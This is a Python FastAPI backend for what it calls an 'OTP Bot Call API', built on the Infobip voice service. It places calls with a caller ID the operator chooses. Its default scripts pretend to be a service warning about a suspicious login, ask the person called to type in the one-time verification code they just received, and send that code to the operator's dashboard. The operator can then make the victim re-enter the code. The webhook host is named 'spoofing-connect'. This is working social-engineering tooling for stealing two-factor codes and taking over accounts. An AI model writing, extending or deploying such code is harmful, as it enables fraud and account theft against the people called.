from fastapi import FastAPI, APIRouter, HTTPException, Depends, status, Request
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict, EmailStr
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import httpx
import jwt
from passlib.context import CryptContext
import socketio
import asyncio
import json

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY')
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', 'qdnddq.api.infobip.com')
INFOBIP_CALLS_CONFIG_ID = os.environ.get('INFOBIP_CALLS_CONFIG_ID')

# Webhook base URL
WEBHOOK_BASE_URL = "https://spoofing-connect.preview.emergentagent.com/api"

# JWT configuration
JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY', 'default_secret')
JWT_ALGORITHM = os.environ.get('JWT_ALGORITHM', 'HS256')
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get('ACCESS_TOKEN_EXPIRE_MINUTES', 1440))

# Password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Socket.IO for real-time updates
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')

# Create FastAPI app
app = FastAPI(title="OTP Bot Call API", version="2.0.0")

# Create Socket.IO ASGI app
socket_app = socketio.ASGIApp(sio, app)

# Store active calls for IVR state management
active_sessions: Dict[str, Dict[str, Any]] = {}

# Create routers
api_router = APIRouter(prefix="/api")
auth_router = APIRouter(prefix="/auth", tags=["Authentication"])
voice_router = APIRouter(prefix="/voice", tags=["Voice Calls"])
otp_router = APIRouter(prefix="/otp", tags=["OTP Bot"])

# ==================== MODELS ====================

class UserCreate(BaseModel):
    email: EmailStr
    password: str
    name: str

class UserLogin(BaseModel):
    email: EmailStr
    password: str

class UserResponse(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    email: str
    name: str
    created_at: str

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    user: UserResponse

class OTPCallConfig(BaseModel):
    recipient_number: str = Field(..., description="Target phone number")
    caller_id: str = Field(..., description="Display caller ID")
    recipient_name: str = Field(default="User", description="Name for greeting")
    service_name: str = Field(default="Account", description="Service name")
    otp_digits: int = Field(default=6, description="Expected OTP digit count")
    language: str = Field(default="en", description="Language code")
    voice_name: str = Field(default="Joanna", description="Voice name for TTS")
    
    step1_message: str = Field(
        default="Hello {name}, we have detected a login attempt to your {service} account from a new device. If you did not recognize this request, please press 1. If this was you, press 0.",
        description="Step 1 greeting message"
    )
    step2_message: str = Field(
        default="Alright, we just sent a {digits} digit verification code to your number. Could you please enter it using your dial pad?",
        description="Step 2 OTP request message"
    )
    step3_message: str = Field(
        default="Okay, please wait a moment while we verify the code.",
        description="Step 3 verification message"
    )
    accepted_message: str = Field(
        default="Okay! We have declined the sign-in request, and your account is safe. Thank you for your time. Have a nice day!",
        description="Accepted/End message"
    )
    rejected_message: str = Field(
        default="I am sorry, but the code you entered is incorrect. Could you please enter it again? It should be {digits} digits.",
        description="Rejected/Retry message"
    )

class CallRecord(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    user_id: str
    phone_number: str
    caller_id: str
    message_text: str
    language: str
    speech_rate: float
    status: str
    infobip_message_id: Optional[str] = None
    created_at: str
    completed_at: Optional[str] = None
    duration_seconds: Optional[int] = None
    error_message: Optional[str] = None

class CallStats(BaseModel):
    total_calls: int
    completed_calls: int
    failed_calls: int
    pending_calls: int
    total_duration: int
    avg_duration: float

# ==================== AUTH HELPERS ====================

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)

def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        user_id = payload.get("sub")
        if user_id is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        
        user = await db.users.find_one({"id": user_id}, {"_id": 0})
        if user is None:
            raise HTTPException(status_code=401, detail="User not found")
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

# ==================== SOCKET.IO EVENTS ====================

@sio.event
async def connect(sid, environ):
    logger.info(f"Client connected: {sid}")

@sio.event
async def disconnect(sid):
    logger.info(f"Client disconnected: {sid}")

@sio.event
async def join_session(sid, data):
    session_id = data.get('session_id')
    if session_id:
        await sio.enter_room(sid, session_id)
        logger.info(f"Client {sid} joined session {session_id}")

async def emit_log(session_id: str, log_type: str, message: str, data: dict = None):
    """Emit log event to all clients in a session"""
    timestamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
    log_entry = {
        "timestamp": timestamp,
        "type": log_type,
        "message": message,
        "data": data or {}
    }
    
    # Store log in database
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$push": {"logs": log_entry}}
    )
    
    # Emit to connected clients
    await sio.emit('call_log', log_entry, room=session_id)
    logger.info(f"[{session_id}] {log_type}: {message}")

# ==================== INFOBIP CALLS API HELPERS ====================

def get_infobip_headers():
    return {
        "Authorization": f"App {INFOBIP_API_KEY}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }

def get_infobip_url(path: str) -> str:
    base = INFOBIP_BASE_URL if INFOBIP_BASE_URL.startswith('http') else f"https://{INFOBIP_BASE_URL}"
    return f"{base}{path}"

async def infobip_request(method: str, path: str, data: dict = None) -> dict:
    """Make request to Infobip API"""
    url = get_infobip_url(path)
    headers = get_infobip_headers()
    
    async with httpx.AsyncClient(timeout=30.0) as http_client:
        if method == "POST":
            response = await http_client.post(url, headers=headers, json=data)
        elif method == "GET":
            response = await http_client.get(url, headers=headers)
        else:
            raise ValueError(f"Unsupported method: {method}")
        
        logger.info(f"Infobip {method} {path}: {response.status_code}")
        logger.info(f"Response: {response.text[:500]}")
        
        if response.status_code in [200, 201]:
            return response.json()
        else:
            raise Exception(f"Infobip API error: {response.status_code} - {response.text}")

async def create_call(session_id: str, to_number: str, from_number: str) -> str:
    """Create outbound call using Infobip Calls API"""
    payload = {
        "endpoint": {
            "type": "PHONE",
            "phoneNumber": to_number
        },
        "from": from_number,
        "callsConfigurationId": INFOBIP_CALLS_CONFIG_ID,
        "customData": {
            "sessionId": session_id
        }
    }
    
    result = await infobip_request("POST", "/calls/1/calls", payload)
    return result.get("id")

async def play_tts(call_id: str, text: str, language: str = "en", voice_name: str = "Joanna"):
    """Play TTS message on active call"""
    payload = {
        "text": text,
        "language": language,
        "voiceName": voice_name
    }
    
    await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)

async def collect_dtmf(call_id: str, max_digits: int, timeout: int = 10, play_text: str = None, language: str = "en"):
    """Collect DTMF digits from caller"""
    payload = {
        "maxLength": max_digits,
        "timeout": timeout,
        "terminator": "#"
    }
    
    if play_text:
        payload["playContent"] = {
            "text": play_text,
            "language": language
        }
    
    await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf", payload)

async def hangup_call(call_id: str):
    """Hangup the call"""
    await infobip_request("POST", f"/calls/1/calls/{call_id}/hangup", {})

# ==================== AUTH ROUTES ====================

@auth_router.post("/register", response_model=TokenResponse)
async def register(user_data: UserCreate):
    existing_user = await db.users.find_one({"email": user_data.email})
    if existing_user:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    user_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    user_doc = {
        "id": user_id,
        "email": user_data.email,
        "name": user_data.name,
        "password_hash": hash_password(user_data.password),
        "created_at": now
    }
    
    await db.users.insert_one(user_doc)
    access_token = create_access_token({"sub": user_id})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(id=user_id, email=user_data.email, name=user_data.name, created_at=now)
    )

@auth_router.post("/login", response_model=TokenResponse)
async def login(credentials: UserLogin):
    user = await db.users.find_one({"email": credentials.email}, {"_id": 0})
    if not user or not verify_password(credentials.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    
    access_token = create_access_token({"sub": user["id"]})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(id=user["id"], email=user["email"], name=user["name"], created_at=user["created_at"])
    )

@auth_router.get("/me", response_model=UserResponse)
async def get_me(current_user: dict = Depends(get_current_user)):
    return UserResponse(
        id=current_user["id"],
        email=current_user["email"],
        name=current_user["name"],
        created_at=current_user["created_at"]
    )

# ==================== OTP BOT ROUTES WITH IVR ====================

@otp_router.post("/initiate-call")
async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(get_current_user)):
    """Initiate an OTP bot call with IVR support"""
    
    session_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    # Format messages with variables
    step1_text = config.step1_message.replace("{name}", config.recipient_name).replace("{service}", config.service_name)
    step2_text = config.step2_message.replace("{digits}", str(config.otp_digits))
    rejected_text = config.rejected_message.replace("{digits}", str(config.otp_digits))
    
    # Create OTP session
    session_doc = {
        "id": session_id,
        "user_id": current_user["id"],
        "recipient_number": config.recipient_number,
        "caller_id": config.caller_id,
        "recipient_name": config.recipient_name,
        "service_name": config.service_name,
        "otp_digits": config.otp_digits,
        "language": config.language,
        "voice_name": config.voice_name,
        "status": "initiating",
        "current_step": 0,
        "dtmf_input": "",
        "first_input": None,
        "otp_received": None,
        "call_id": None,
        "created_at": now,
        "logs": [],
        "messages": {
            "step1": step1_text,
            "step2": step2_text,
            "step3": config.step3_message,
            "accepted": config.accepted_message,
            "rejected": rejected_text
        }
    }
    
    await db.otp_sessions.insert_one(session_doc)
    
    # Store in active sessions for webhook handling
    active_sessions[session_id] = session_doc
    
    await emit_log(session_id, "info", "🤖 OTP Bot initialized")
    await emit_log(session_id, "call", f"🚦 Initiating call to {config.recipient_number}")
    
    try:
        # Create call using Infobip Calls API
        call_id = await create_call(session_id, config.recipient_number, config.caller_id)
        
        # Update session with call ID
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {"call_id": call_id, "status": "ringing"}}
        )
        active_sessions[session_id]["call_id"] = call_id
        
        await emit_log(session_id, "success", f"📲 Call created successfully", {"call_id": call_id})
        
        return {
            "session_id": session_id,
            "call_id": call_id,
            "status": "ringing"
        }
        
    except Exception as e:
        error_msg = str(e)
        logger.error(f"Failed to create call: {error_msg}")
        
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {"status": "failed", "error": error_msg}}
        )
        await emit_log(session_id, "error", f"❌ Failed to create call: {error_msg}")
        
        raise HTTPException(status_code=500, detail=error_msg)

@otp_router.post("/webhook/call-events")
async def handle_call_events(request: Request):
    """Handle Infobip call events webhook"""
    try:
        body = await request.json()
        logger.info(f"Call event received: {json.dumps(body, indent=2)}")
        
        # Get session ID from custom data or find by call ID
        call_id = body.get("callId") or body.get("id")
        custom_data = body.get("customData", {})
        session_id = custom_data.get("sessionId")
        
        if not session_id:
            # Find session by call ID
            session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
            if session:
                session_id = session["id"]
        
        if not session_id:
            logger.warning(f"No session found for call {call_id}")
            return {"status": "no_session"}
        
        # Get session from memory or DB
        session = active_sessions.get(session_id)
        if not session:
            session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
            if session:
                active_sessions[session_id] = session
        
        if not session:
            return {"status": "session_not_found"}
        
        event_type = body.get("type") or body.get("state")
        
        if event_type == "CALL_RINGING":
            await emit_log(session_id, "info", "📞 Call ringing...")
            
        elif event_type == "CALL_ESTABLISHED" or event_type == "ESTABLISHED":
            await emit_log(session_id, "success", "✅ Call answered!")
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "step1", "current_step": 1}}
            )
            
            # Play Step 1 message and collect single digit
            await emit_log(session_id, "step", "🎙️ Playing Step 1: Greeting message")
            
            step1_text = session["messages"]["step1"]
            await collect_dtmf(
                call_id, 
                max_digits=1, 
                timeout=30,
                play_text=step1_text,
                language=session.get("language", "en")
            )
            
        elif event_type == "CALL_FINISHED" or event_type == "FINISHED":
            reason = body.get("errorCode", {}).get("name") or body.get("reason", "completed")
            await emit_log(session_id, "info", f"📴 Call ended: {reason}")
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "completed"}}
            )
            
            # Clean up active session
            if session_id in active_sessions:
                del active_sessions[session_id]
                
        elif event_type == "CALL_FAILED":
            error = body.get("errorCode", {}).get("description", "Unknown error")
            await emit_log(session_id, "error", f"❌ Call failed: {error}")
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "failed"}}
            )
        
        return {"status": "processed"}
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"status": "error", "message": str(e)}

@otp_router.post("/webhook/dtmf")
async def handle_dtmf_webhook(request: Request):
    """Handle DTMF input webhook from Infobip"""
    try:
        body = await request.json()
        logger.info(f"DTMF event received: {json.dumps(body, indent=2)}")
        
        call_id = body.get("callId")
        dtmf_value = body.get("dtmf") or body.get("value") or ""
        
        # Find session by call ID
        session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
        if not session:
            logger.warning(f"No session found for DTMF on call {call_id}")
            return {"status": "no_session"}
        
        session_id = session["id"]
        current_step = session.get("current_step", 1)
        otp_digits = session.get("otp_digits", 6)
        
        await emit_log(session_id, "dtmf", f"➡️ DTMF received: {dtmf_value}")
        
        if current_step == 1:
            # First input (1 or 0)
            await emit_log(session_id, "info", f"👆 Target pressed: {dtmf_value}")
            
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"first_input": dtmf_value, "current_step": 2, "status": "step2"}}
            )
            
            # Move to Step 2 - collect OTP
            await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP request")
            
            step2_text = session["messages"]["step2"]
            await collect_dtmf(
                call_id,
                max_digits=otp_digits,
                timeout=60,
                play_text=step2_text,
                language=session.get("language", "en")
            )
            
        elif current_step == 2:
            # OTP digits received
            otp_code = dtmf_value.replace("#", "")
            
            if len(otp_code) >= otp_digits:
                otp_code = otp_code[:otp_digits]
                
                await emit_log(session_id, "otp", f"🕵️ OTP submitted: {otp_code}", {"otp": otp_code})
                
                # Play step 3 and wait for admin
                await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification wait")
                
                step3_text = session["messages"]["step3"]
                await play_tts(call_id, step3_text, session.get("language", "en"), session.get("voice_name", "Joanna"))
                
                await db.otp_sessions.update_one(
                    {"id": session_id},
                    {"$set": {
                        "otp_received": otp_code,
                        "current_step": 3,
                        "status": "waiting_approval"
                    }}
                )
                
                await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
            else:
                await emit_log(session_id, "warning", f"⚠️ Incomplete OTP: {otp_code} ({len(otp_code)}/{otp_digits} digits)")
        
        return {"status": "processed"}
        
    except Exception as e:
        logger.error(f"DTMF webhook error: {e}")
        return {"status": "error", "message": str(e)}

@otp_router.post("/accept/{session_id}")
async def accept_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin accepts the OTP - play accepted message and end call"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    await emit_log(session_id, "action", "✅ Admin pressed ACCEPT")
    await emit_log(session_id, "step", "🎙️ Playing Accepted message")
    
    try:
        # Play accepted message
        accepted_text = session["messages"]["accepted"]
        await play_tts(call_id, accepted_text, session.get("language", "en"), session.get("voice_name", "Joanna"))
        
        # Wait a bit then hangup
        await asyncio.sleep(5)
        await hangup_call(call_id)
        
        await emit_log(session_id, "success", "📴 Call completed successfully")
        
    except Exception as e:
        logger.error(f"Error in accept: {e}")
        await emit_log(session_id, "error", f"Error playing message: {str(e)}")
    
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "completed", "result": "accepted"}}
    )
    
    return {"status": "accepted", "otp": session.get("otp_received")}

@otp_router.post("/reject/{session_id}")
async def reject_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin rejects the OTP - play retry message and collect again"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    await emit_log(session_id, "action", "❌ Admin pressed REJECT")
    await emit_log(session_id, "step", "🎙️ Playing Retry message")
    
    try:
        # Play rejected message and collect again
        rejected_text = session["messages"]["rejected"]
        otp_digits = session.get("otp_digits", 6)
        
        await collect_dtmf(
            call_id,
            max_digits=otp_digits,
            timeout=60,
            play_text=rejected_text,
            language=session.get("language", "en")
        )
        
        await emit_log(session_id, "info", "🔄 Waiting for new OTP input...")
        
    except Exception as e:
        logger.error(f"Error in reject: {e}")
        await emit_log(session_id, "error", f"Error: {str(e)}")
    
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "step2", "current_step": 2, "otp_received": None}}
    )
    
    return {"status": "rejected"}

@otp_router.post("/hangup/{session_id}")
async def hangup_session(session_id: str, current_user: dict = Depends(get_current_user)):
    """Manually hangup the call"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if call_id:
        try:
            await hangup_call(call_id)
            await emit_log(session_id, "info", "📴 Call ended by admin")
        except Exception as e:
            logger.error(f"Error hanging up: {e}")
    
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "completed"}}
    )
    
    return {"status": "hangup"}

@otp_router.get("/session/{session_id}")
async def get_otp_session(session_id: str, current_user: dict = Depends(get_current_user)):
    """Get OTP session details"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return session

@otp_router.get("/sessions")
async def get_otp_sessions(current_user: dict = Depends(get_current_user)):
    """Get all OTP sessions for current user"""
    sessions = await db.otp_sessions.find(
        {"user_id": current_user["id"]},
        {"_id": 0}
    ).sort("created_at", -1).limit(50).to_list(50)
    return sessions

# ==================== VOICE ROUTES (Simple TTS) ====================

@voice_router.post("/call", response_model=CallRecord)
async def send_voice_call(
    phone_number: str,
    caller_id: str,
    message_text: str,
    language: str = "en",
    speech_rate: float = 1.0,
    repeat_count: int = 2,
    current_user: dict = Depends(get_current_user)
):
    """Send a simple voice call with TTS"""
    call_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    call_doc = {
        "id": call_id,
        "user_id": current_user["id"],
        "phone_number": phone_number,
        "caller_id": caller_id,
        "message_text": message_text,
        "language": language,
        "speech_rate": speech_rate,
        "status": "pending",
        "infobip_message_id": None,
        "created_at": now,
        "completed_at": None,
        "duration_seconds": None,
        "error_message": None
    }
    
    await db.calls.insert_one(call_doc)
    
    full_message = (message_text + ". . . ") * repeat_count
    
    headers = get_infobip_headers()
    payload = {
        "messages": [{
            "from": caller_id,
            "destinations": [{"to": phone_number}],
            "text": full_message,
            "language": language,
            "speechRate": speech_rate
        }]
    }
    
    try:
        result = await infobip_request("POST", "/tts/3/advanced", payload)
        infobip_message_id = result.get("messages", [{}])[0].get("messageId")
        
        await db.calls.update_one(
            {"id": call_id},
            {"$set": {"status": "initiated", "infobip_message_id": infobip_message_id}}
        )
        call_doc["status"] = "initiated"
        call_doc["infobip_message_id"] = infobip_message_id
        
    except Exception as e:
        error_msg = str(e)
        await db.calls.update_one(
            {"id": call_id},
            {"$set": {"status": "failed", "error_message": error_msg}}
        )
        call_doc["status"] = "failed"
        call_doc["error_message"] = error_msg
    
    call_doc.pop("_id", None)
    return CallRecord(**call_doc)

@voice_router.get("/history", response_model=List[CallRecord])
async def get_call_history(limit: int = 50, skip: int = 0, current_user: dict = Depends(get_current_user)):
    calls = await db.calls.find({"user_id": current_user["id"]}, {"_id": 0}).sort("created_at", -1).skip(skip).limit(limit).to_list(limit)
    return [CallRecord(**call) for call in calls]

@voice_router.get("/stats", response_model=CallStats)
async def get_call_stats(current_user: dict = Depends(get_current_user)):
    pipeline = [
        {"$match": {"user_id": current_user["id"]}},
        {"$group": {
            "_id": None,
            "total_calls": {"$sum": 1},
            "completed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "completed"]}, 1, 0]}},
            "failed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "failed"]}, 1, 0]}},
            "pending_calls": {"$sum": {"$cond": [{"$in": ["$status", ["pending", "initiated"]]}, 1, 0]}},
            "total_duration": {"$sum": {"$ifNull": ["$duration_seconds", 0]}}
        }}
    ]
    
    result = await db.calls.aggregate(pipeline).to_list(1)
    
    if result:
        stats = result[0]
        avg_duration = stats["total_duration"] / stats["completed_calls"] if stats["completed_calls"] > 0 else 0
        return CallStats(
            total_calls=stats["total_calls"],
            completed_calls=stats["completed_calls"],
            failed_calls=stats["failed_calls"],
            pending_calls=stats["pending_calls"],
            total_duration=stats["total_duration"],
            avg_duration=round(avg_duration, 2)
        )
    
    return CallStats(total_calls=0, completed_calls=0, failed_calls=0, pending_calls=0, total_duration=0, avg_duration=0)

# ==================== MAIN ROUTES ====================

@api_router.get("/")
async def root():
    return {"message": "OTP Bot Call API v2.0 with IVR"}

@api_router.get("/health")
async def health_check():
    return {"status": "healthy", "service": "otp-bot-api", "ivr": "enabled"}

# Include routers
api_router.include_router(auth_router)
api_router.include_router(voice_router)
api_router.include_router(otp_router)
app.include_router(api_router)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
